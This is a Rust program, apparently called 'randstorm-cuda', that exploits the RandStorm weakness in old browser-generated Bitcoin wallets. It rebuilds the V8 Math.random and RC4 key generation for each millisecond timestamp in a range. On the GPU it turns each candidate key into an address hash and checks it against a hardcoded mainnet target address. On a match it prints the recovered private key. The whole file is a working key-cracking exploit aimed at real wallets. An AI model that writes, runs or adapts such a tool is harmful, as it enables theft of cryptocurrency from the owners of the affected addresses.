mod ec_table;
mod cuda;

use bitcoin::address::Address;
use clap::Parser;
use indicatif::{ProgressBar, ProgressStyle};
use std::str::FromStr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};

mod prng {
    pub struct XorShift128Plus { s0: u64, s1: u64 }
    impl XorShift128Plus {
        pub fn new(seed: u64) -> Self { let mut s = Self{s0:0,s1:0}; s.seed(seed); s }
        fn seed(&mut self, seed: u64) {
            self.s0 = Self::splitmix(seed); self.s1 = Self::splitmix(self.s0);
            for _ in 0..10 { self.next_raw(); }
        }
        fn next_raw(&mut self) -> u64 {
            let mut s1 = self.s0; let s0 = self.s1; self.s0 = s0;
            s1 ^= s1 << 23; s1 ^= s0; s1 ^= s1 >> 17; s1 ^= s0 >> 26; self.s1 = s1;
            s1.wrapping_add(s0)
        }
        pub fn next_u16(&mut self) -> u16 { (self.next_raw() >> 37) as u16 }
        fn splitmix(mut x: u64) -> u64 {
            x = x.wrapping_add(0x9e3779b97f4a7c15);
            x = (x ^ (x >> 30)).wrapping_mul(0xbf58476d1ce4e5b9);
            x = (x ^ (x >> 27)).wrapping_mul(0x94d049bb133111eb);
            x ^ (x >> 31)
        }
    }

    pub struct ArcFour { i: u8, j: u8, s: [u8; 256] }
    impl ArcFour {
        pub fn new(key: &[u8]) -> Self {
            let mut s = [0u8; 256];
            for (i, v) in s.iter_mut().enumerate() { *v = i as u8; }
            let mut j = 0u8;
            for i in 0..256u16 {
                j = j.wrapping_add(s[i as usize]).wrapping_add(key[i as usize % key.len()]);
                s.swap(i as usize, j as usize);
            }
            ArcFour { i: 0, j: 0, s }
        }
        pub fn next(&mut self) -> u8 {
            self.i = self.i.wrapping_add(1);
            self.j = self.j.wrapping_add(self.s[self.i as usize]);
            self.s.swap(self.i as usize, self.j as usize);
            let idx = self.s[self.i as usize].wrapping_add(self.s[self.j as usize]);
            self.s[idx as usize]
        }
    }

    pub struct SecureRandom { arc4: ArcFour }
    impl SecureRandom {
        pub fn from_pool(pool: &[u8; 256], seed_time: u64) -> Self {
            let mut p = *pool;
            p[0] ^= seed_time as u8; p[1] ^= (seed_time>>8) as u8;
            p[2] ^= (seed_time>>16) as u8; p[3] ^= (seed_time>>24) as u8;
            SecureRandom { arc4: ArcFour::new(&p) }
        }
        pub fn get_bytes(&mut self, buf: &mut [u8]) {
            for b in buf.iter_mut() { *b = self.arc4.next(); }
        }
    }
}

use prng::{XorShift128Plus, SecureRandom};
use ec_table::{EcTable, NLIMBS};

type Fe = [u32; NLIMBS];

#[derive(Parser, Debug)]
#[command(name = "randstorm-cuda")]
#[command(version, about = "RandStorm — Optimized CUDA with Batch Inversion")]
struct Args {
    #[arg(long, default_value = "1LdRcdxfbSnmCYYNdeYpUnztiYzVfBEQeC")]
    target: String,

    #[arg(long, default_value = "1388534400000")]
    start: u64,

    #[arg(long, default_value = "1401234582000")]
    end: u64,

    #[arg(short, long, default_value_t = 0xDEADBEEF)]
    v8seed: u64,

    #[arg(long, default_value_t = 16384)]
    batch_size: usize,
}

fn main() {
    let args = Args::parse();

    let target_addr = Address::from_str(&args.target)
        .expect("Invalid address")
        .require_network(bitcoin::Network::Bitcoin)
        .expect("Not mainnet");
    let script = target_addr.script_pubkey();
    let target_h160: [u8; 20] = script.as_bytes()[3..23].try_into().unwrap();

    let total = args.end - args.start;
    eprintln!("randstorm-cuda — Batch Inversion Pipeline");
    eprintln!("Target: {}  Hash160: {}", args.target, hex::encode(target_h160));
    eprintln!("Seeds: {} → {}  (total: {})", args.start, args.end, total);

    let base_pool = {
        let mut prng = XorShift128Plus::new(args.v8seed);
        let mut pool = [0u8; 256];
        let mut p = 0;
        while p < 256 {
            let t = prng.next_u16();
            pool[p] = (t >> 8) as u8; p += 1;
            pool[p] = t as u8; p += 1;
        }
        pool
    };

    eprintln!("Precomputing EC table (256 points)...");
    let ec_table = EcTable::precompute();
    eprintln!("EC table ready ({} KB)", std::mem::size_of::<EcTable>() / 1024);

    let cuda = cuda::CudaContext::try_init().expect("CUDA required for randstorm-cuda");
    if !cuda.upload_ec_table(&ec_table) {
        eprintln!("Failed to upload EC table to GPU");
        return;
    }
    eprintln!("[CUDA] EC table uploaded to constant memory");

    let batch = args.batch_size;
    let pb = ProgressBar::new(total);
    pb.set_style(ProgressStyle::default_bar()
        .template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} ({per_sec} keys/s, ETA: {eta})")
        .unwrap().progress_chars("#>- "));

    let found = Arc::new(AtomicBool::new(false));
    let found_key = Arc::new(Mutex::new(None::<String>));
    let mut current = args.start;

    let mut key_buf = vec![0u8; batch * 32];
    let mut z_buf = vec![0u32; batch * NLIMBS];
    let mut h160_results = vec![[0u8; 20]; batch];

    while current < args.end && !found.load(Ordering::Relaxed) {
        let n = (batch as u64).min(args.end - current) as usize;

        for i in 0..n {
            let mut sr = SecureRandom::from_pool(&base_pool, current + i as u64);
            sr.get_bytes(&mut key_buf[i*32..(i+1)*32]);
        }

        // GPU Phase 1: private keys → Jacobian (Z values returned to CPU)
        let z_values: &[Fe] = unsafe {
            if cuda.pk_to_jacobian(&key_buf[..n*32], n, &mut z_buf).is_none() {
                eprintln!("GPU Phase 1 failed");
                break;
            }
            std::slice::from_raw_parts(z_buf.as_ptr() as *const Fe, n)
        };

        // CPU: batch inversion (1 modular inverse + O(N) multiplications)
        let z_invs = ec_table::batch_invert(z_values);

        let z_inv_flat: &[u32] = unsafe {
            std::slice::from_raw_parts(z_invs.as_ptr() as *const u32, n * NLIMBS)
        };

        // GPU Phase 2: Jacobian + Z-inverse → affine → hash160
        if cuda.jacobian_to_hash160(z_inv_flat, n, &mut h160_results).is_some() {
            for i in 0..n {
                if h160_results[i] == target_h160 {
                    let key_hex = key_buf[i*32..(i+1)*32].iter()
                        .map(|b| format!("{:02x}", b)).collect::<String>();
                    eprintln!("\n\nMATCH! Seed: {} Key: {}", current + i as u64, key_hex);
                    *found_key.lock().unwrap() = Some(key_hex);
                    found.store(true, Ordering::Relaxed);
                    break;
                }
            }
        } else {
            eprintln!("GPU Phase 2 failed");
            break;
        }

        current += n as u64;
        pb.inc(n as u64);
    }

    pb.finish_with_message("Done");

    let guard = found_key.lock().unwrap();
    if let Some(key) = guard.as_ref() {
        println!("Private Key: {}", key);
    } else {
        println!("No match found.");
    }
}
